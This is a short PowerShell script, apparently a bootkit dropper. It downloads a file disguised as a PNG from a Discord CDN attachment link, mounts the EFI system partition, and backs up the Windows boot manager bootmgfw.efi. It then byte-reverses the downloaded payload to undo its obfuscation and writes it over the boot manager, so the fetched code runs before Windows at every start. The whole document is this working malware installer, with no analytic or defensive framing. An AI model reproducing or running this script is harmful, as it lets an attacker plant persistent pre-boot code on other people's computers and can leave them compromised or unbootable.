Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/674573769422929920/981664019926646834/file.png" -OutFile "C:\Windows\Temp\file.png";
mountvol Y: /s;
Copy-Item -Path Y:\EFI\Microsoft\Boot\bootmgfw.efi -Destination Y:\EFI\Microsoft\Boot\bootmgfw.efi.old;
$file = [io.file]::ReadAllBytes("C:\Windows\Temp\file.png");
[array]::Reverse($file);
[io.file]::WriteAllBytes("Y:\EFI\Microsoft\Boot\bootmgfw.efi",$file);
mountvol Y: /d;
